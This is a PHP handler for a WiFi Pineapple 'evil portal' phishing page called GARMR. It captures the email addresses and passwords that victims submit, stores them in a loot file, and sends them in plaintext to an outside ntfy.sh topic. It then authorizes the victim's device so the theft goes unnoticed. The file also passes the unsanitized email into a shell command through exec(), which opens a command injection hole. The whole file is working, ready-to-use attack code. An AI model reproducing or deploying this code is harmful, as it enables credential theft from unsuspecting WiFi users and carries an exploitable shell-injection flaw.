<?php
namespace evilportal;

header("Cache-Control: no-store, no-cache, must-revalidate");
require_once('/pineapple/ui/modules/evilportal/assets/api/Portal.php');
require_once('MyPortal.php');

$ntfy_enabled = 1;
$ntfy_topic = "IgOtyrrass8107_ntfy";

function send_ntfy($title, $message, $priority, $tags) {
    global $ntfy_enabled, $ntfy_topic;
    if (!$ntfy_enabled || empty($ntfy_topic)) return;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://ntfy.sh/$ntfy_topic");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $message);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Title: $title", "Priority: $priority", "Tags: $tags"]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}

$loot_file = '/root/loot/garmr/credentials.txt';
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$client_ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');

@mkdir('/root/loot/garmr', 0755, true);

if (!empty($email)) {
    $entry = "[$timestamp] WiFi | IP: $client_ip | Email: $email | Password: $password\n";
    file_put_contents($loot_file, $entry, FILE_APPEND);
    send_ntfy("GARMR: WiFi Creds!", "Email: $email\nPassword: $password", "high", "wifi,key");
    exec("PYTHONPATH=/usr/lib/pineapple; export PYTHONPATH; /usr/bin/python3 /usr/bin/notify info 'GARMR: WiFi creds - $email' evilportal &");

    $portal = new MyPortal((object)$_POST);
    $portal->authorizeClient($client_ip);
}

header("Location: index.php?stage=success");
